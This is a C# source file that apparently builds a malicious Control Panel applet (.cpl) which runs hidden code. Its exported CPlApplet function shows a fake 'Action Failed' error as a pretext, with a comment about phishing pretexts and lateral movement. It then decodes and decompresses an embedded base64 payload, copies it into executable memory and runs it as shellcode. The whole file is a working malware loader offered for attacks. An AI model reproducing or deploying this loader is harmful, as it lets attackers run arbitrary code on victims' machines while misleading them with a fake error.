using System;
using System.Runtime.InteropServices;
using RGiesecke.DllExport;
using System.Reflection;
using System.IO;
using System.Text;
using System.IO.MemoryMappedFiles;
using System.Windows.Forms;

public class Test
{
    private static string ExtractResource(string filename)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = filename;

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            string result = reader.ReadToEnd();
            return result;
        }

    }
    private delegate IntPtr GetPebDelegate();

    static byte[] Decompress(byte[] gzip)
    {
        using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
            System.IO.Compression.CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
    public unsafe static IntPtr CPlApplet()
    {
        // Change this for your pretext or comment out for lateral movement
        MessageBox.Show("Action Failed Error Number 2950");
        
        string scode = ExtractResource("ControlPanelMaker.Resources.txt");
        byte[] blob = Convert.FromBase64String(scode);
        byte[] shellcode = Decompress(blob);

        if (shellcode.Length == 0) return IntPtr.Zero;

        MemoryMappedFile mmf = null;
        MemoryMappedViewAccessor mmva = null;

        try
        {
            // Create a read/write/executable memory mapped file to hold our shellcode..
            mmf = MemoryMappedFile.CreateNew("__shellcode", shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

            // Create a memory mapped view accessor with read/write/execute permissions..
            mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

            // Write the shellcode to the MMF..
            mmva.WriteArray(0, shellcode, 0, shellcode.Length);

            // Obtain a pointer to our MMF..
            var pointer = (byte*)0;
            mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

            // Create a function delegate to the shellcode in our MMF..
            var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));

            // Invoke the shellcode..
            return func();
        }
        catch
        {
            return IntPtr.Zero;
        }
        finally
        {
            mmva?.Dispose();
            mmf?.Dispose();
        }
    }
}